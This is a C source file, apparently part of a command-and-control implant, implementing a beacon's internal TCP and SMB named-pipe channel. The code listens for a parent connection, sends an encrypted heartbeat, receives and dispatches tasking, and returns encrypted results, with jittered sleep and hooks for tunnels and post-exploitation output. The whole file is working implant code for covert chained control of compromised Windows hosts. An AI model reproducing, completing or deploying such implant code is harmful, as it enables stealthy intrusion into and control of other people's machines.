#include "beacon_agent_internal.h"

#if !defined(BEACON_EXTERNAL_TCP_BUILD)

/* 加密并通过父级 TCP/SMB channel 发送所有出站数据包 */
static INT FlushOutboxInternal(BeaconContext* ctx, CascadeIo* upstream)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted;

        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }

        if (!CascadeIoWriteFrame(upstream, CASCADE_FRAME_RESULT, &encrypted)) {
            BbFree(&encrypted);
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }

        BbFree(&encrypted);

        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }

    return 1;
}

typedef struct InternalInbound {
    ByteBuf packet;
    struct InternalInbound* next;
} InternalInbound;

typedef struct InternalRunState {
    BeaconContext* ctx;
    CascadeIo* upstream;
    CRITICAL_SECTION lock;
    HANDLE event;
    InternalInbound* head;
    InternalInbound* tail;
    LONG active;
    CascadeFrameReader frame_reader;
} InternalRunState;

static VOID InternalQueueTask(InternalRunState* state, ByteBuf* packet)
{
    InternalInbound* item;

    item = (InternalInbound*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*item));
    if (!item) {
        BbFree(packet);
        return;
    }

    item->packet = *packet;
    BbInit(packet);

    EnterCriticalSection(&state->lock);
    if (state->tail) {
        state->tail->next = item;
    } else {
        state->head = item;
    }
    state->tail = item;
    LeaveCriticalSection(&state->lock);

    SetEvent(state->event);
}

static InternalInbound* InternalDrainTasks(InternalRunState* state)
{
    InternalInbound* list;

    EnterCriticalSection(&state->lock);
    list = state->head;
    state->head = NULL;
    state->tail = NULL;
    LeaveCriticalSection(&state->lock);

    return list;
}

static INT InternalFeedFrameData(InternalRunState* state, const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        UINT16 cmd = 0;
        ByteBuf body;
        INT consumed;

        BbInit(&body);
        consumed = CascadeFrameReaderFeed(&state->frame_reader, data + off, len - off, &cmd, &body);
        if (consumed < 0) return -1;
        if (consumed == 0) break;
        off += (SIZE_T)consumed;
        if (cmd == 0) continue;

        if (cmd == CASCADE_FRAME_TASK) {
            InternalQueueTask(state, &body);
        } else if (cmd == CASCADE_FRAME_PING) {
            CascadeIoWriteFrame(state->upstream, CASCADE_FRAME_PING, &body);
            BbFree(&body);
        } else if (cmd == CASCADE_FRAME_CLOSE) {
            BbFree(&body);
            return -1;
        } else {
            BbFree(&body);
        }
    }
    return 0;
}

static INT InternalPumpTcp(InternalRunState* state)
{
    BYTE8 buf[8192];
    INT n;

    if (!state || !state->ctx) return -1;

    for (;;) {
        n = recv(state->upstream->sock, (CHAR*)buf, sizeof(buf), 0);
        if (n > 0) {
            if (InternalFeedFrameData(state, buf, (SIZE_T)n) < 0) return -1;
        } else if (n == 0) {
            return -1;
        } else {
            if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
            return -1;
        }
    }
}

static INT InternalPumpPipe(InternalRunState* state)
{
    CascadeIo* io = state->upstream;
    DWORD read_bytes;

    if (io->read_pending) {
        if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) return -1;
        io->read_pending = FALSE;
        if (read_bytes == 0) return -1;
        if (InternalFeedFrameData(state, io->read_buf, read_bytes) < 0) return -1;
        if (read_bytes < sizeof(io->read_buf)) return 0;
    }

    for (;;) {
        ResetEvent(io->read_event);
        ZeroMemory(&io->read_olap, sizeof(io->read_olap));
        io->read_olap.hEvent = io->read_event;
        if (!ReadFile(io->pipe, io->read_buf, sizeof(io->read_buf), &read_bytes, &io->read_olap)) {
            if (GetLastError() == ERROR_IO_PENDING) {
                io->read_pending = TRUE;
                return 0;
            }
            return -1;
        }
        if (read_bytes == 0) return -1;
        if (InternalFeedFrameData(state, io->read_buf, read_bytes) < 0) return -1;
        if (read_bytes < sizeof(io->read_buf)) return 0;
    }
}

static INT SendInternalHello(BeaconContext* ctx, CascadeIo* upstream)
{
    ByteBuf plain;
    ByteBuf heartbeat;
    ByteBuf body;
    ByteBuf packed_heartbeat;
    CHAR id[16];
    INT ok;

    plain = AgentBuildHeartbeatPlain(ctx);
    ok = CryptoEncryptHeartbeat(ctx->profile.encrypt_key, &plain, &heartbeat);
    BbFree(&plain);
    if (!ok) {
        return 0;
    }

    BbInit(&body);
    snprintf(id, sizeof(id), "%08lx", (ULONG)ctx->beacon_id);
    PacketArrayString(&body, id);
    packed_heartbeat = PacketPackBytes(&heartbeat);
    PacketArrayBytes(&body, packed_heartbeat.data, packed_heartbeat.len);
    BbFree(&packed_heartbeat);

    ok = CascadeIoWriteFrame(upstream, CASCADE_FRAME_HELLO, &body);
    BbFree(&body);
    BbFree(&heartbeat);
    return ok;
}

static VOID InternalFreePending(InternalRunState* state)
{
    InternalInbound* list = InternalDrainTasks(state);

    while (list) {
        InternalInbound* next = list->next;
        BbFree(&list->packet);
        HeapFree(GetProcessHeap(), 0, list);
        list = next;
    }
}

static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
{
    BeaconContext* ctx = &agent->ctx;
    InternalRunState state;
    BOOL is_tcp;

    is_tcp = upstream->kind == CASCADE_IO_TCP;
    if (is_tcp) {
        if (!CascadeIoEnableTcpReadEvent(upstream)) {
            CascadeIoClose(upstream);
            return -1;
        }
    } else {
        if (!CascadeIoEnablePipeReadEvent(upstream)) {
            CascadeIoClose(upstream);
            return -1;
        }
    }

    if (!SendInternalHello(ctx, upstream)) {
        CascadeIoClose(upstream);
        return -1;
    }

    ZeroMemory(&state, sizeof(state));
    state.ctx = ctx;
    state.upstream = upstream;
    state.active = 1;
    state.event = CreateEventW(NULL, FALSE, FALSE, NULL);
    InitializeCriticalSection(&state.lock);
    CascadeFrameReaderInit(&state.frame_reader);

    if (!is_tcp) {
        if (InternalPumpPipe(&state) < 0) {
            CascadeIoClose(upstream);
            CascadeFrameReaderFree(&state.frame_reader);
            DeleteCriticalSection(&state.lock);
            CloseHandle(state.event);
            return -1;
        }
    }

    while (ctx->active &&
           InterlockedCompareExchange(&agent->stop, 0, 0) == 0 &&
           InterlockedCompareExchange(&state.active, 1, 1)) {
        HANDLE handles[2];
        DWORD count = 0;
        DWORD wait_ms = SleepCalculateWithJitter(&ctx->profile);
        DWORD wait_result;
        InternalInbound* list;

        handles[count++] = CascadeIoEvent(upstream);
        if (ctx->runtime.wake_event) {
            handles[count++] = ctx->runtime.wake_event;
        }
        if (wait_ms == 0) wait_ms = 1000;
        wait_result = BeaconWait(ctx, handles, count, wait_ms);
        if (wait_result == WAIT_OBJECT_0) {
            if (is_tcp) {
                LONG events = 0;

                if (!CascadeIoConsumeTcpEvent(upstream, &events)) break;
                if ((events & FD_READ) && InternalPumpTcp(&state) < 0) break;
                if (events & FD_CLOSE) break;
                if (!CascadeIoRearmTcpReadEvent(upstream)) break;
            } else {
                if (InternalPumpPipe(&state) < 0) break;
            }
        } else if (wait_result == WAIT_FAILED) {
            break;
        }

        list = InternalDrainTasks(&state);
        while (list) {
            InternalInbound* next = list->next;
            AgentDispatchTasks(ctx, &list->packet);
            BbFree(&list->packet);
            HeapFree(GetProcessHeap(), 0, list);
            list = next;
        }

        AgentFlushTransfers(ctx);
        AgentFlushTunnels(ctx);
        AgentFlushCascade(ctx);
        AgentFlushPostEx(ctx);
        if (!FlushOutboxInternal(ctx, upstream)) break;
    }

    InterlockedExchange(&state.active, 0);
    CascadeIoClose(upstream);
    SetEvent(state.event);
    InternalFreePending(&state);

    CascadeFrameReaderFree(&state.frame_reader);
    DeleteCriticalSection(&state.lock);
    CloseHandle(state.event);
    return 0;
}

static INT AgentShouldRunInternal(Agent* agent)
{
    return agent &&
           agent->ctx.active &&
           InterlockedCompareExchange(&agent->stop, 0, 0) == 0;
}

static VOID AgentInternalReconnectDelay(Agent* agent)
{
    HANDLE wake_event;

    if (!AgentShouldRunInternal(agent)) return;

    wake_event = agent->ctx.runtime.wake_event;
    if (wake_event) {
        WaitForSingleObject(wake_event, 1000);
    } else {
        Sleep(1000);
    }
}

INT AgentRunInternalTcp(Agent* agent)
{
    INT result = 0;

    while (AgentShouldRunInternal(agent)) {
        CascadeTcpListener listener;
        CascadeIo upstream;
        HANDLE handles[2];
        DWORD count;
        DWORD wait_ms;
        DWORD wait_result;
        BOOL accepted = FALSE;

        DebugPrintf("[*] Internal TCP listening on %s:%d\n",
                    agent->ctx.profile.tcp_internal.bind_host,
                    agent->ctx.profile.tcp_internal.bind_port);

        CascadeTcpListenerInit(&listener);
        if (!CascadeTcpListen(agent->ctx.profile.tcp_internal.bind_host,
                              agent->ctx.profile.tcp_internal.bind_port,
                              &listener)) {
            result = -1;
            break;
        }

        while (AgentShouldRunInternal(agent)) {
            count = 0;
            handles[count++] = CascadeTcpListenerEvent(&listener);
            if (agent->ctx.runtime.wake_event) {
                handles[count++] = agent->ctx.runtime.wake_event;
            }

            wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
            if (wait_ms == 0) wait_ms = 1000;
            wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
            if (wait_result == WAIT_OBJECT_0) {
                accepted = CascadeTcpAcceptReady(&listener, &upstream);
                if (accepted) break;
            } else if (wait_result == WAIT_FAILED) {
                result = -1;
                break;
            }
        }

        CascadeTcpListenerClose(&listener);
        if (!accepted) break;

        AgentRunInternal(agent, &upstream);
        AgentInternalReconnectDelay(agent);
    }

    return result;
}

INT AgentRunInternalSmb(Agent* agent)
{
    INT result = 0;

    while (AgentShouldRunInternal(agent)) {
        CascadePipeListener listener;
        CascadeIo upstream;
        HANDLE handles[2];
        DWORD count;
        DWORD wait_ms;
        DWORD wait_result;
        BOOL accepted = FALSE;

        DebugPrintf("[*] Internal SMB listening on %s\n",
                    agent->ctx.profile.smb_internal.pipe_name);

        CascadePipeListenerInit(&listener);
        if (!CascadePipeListen(agent->ctx.profile.smb_internal.pipe_name, &listener)) {
            result = -1;
            break;
        }

        while (AgentShouldRunInternal(agent)) {
            count = 0;
            handles[count++] = CascadePipeListenerEvent(&listener);
            if (agent->ctx.runtime.wake_event) {
                handles[count++] = agent->ctx.runtime.wake_event;
            }

            wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
            if (wait_ms == 0) wait_ms = 1000;
            wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
            if (wait_result == WAIT_OBJECT_0) {
                accepted = CascadePipeAcceptReady(&listener, &upstream);
                if (accepted) break;
            } else if (wait_result == WAIT_FAILED) {
                result = -1;
                break;
            }
        }

        CascadePipeListenerClose(&listener);
        if (!accepted) break;

        AgentRunInternal(agent, &upstream);
        AgentInternalReconnectDelay(agent);
    }

    return result;
}

#endif
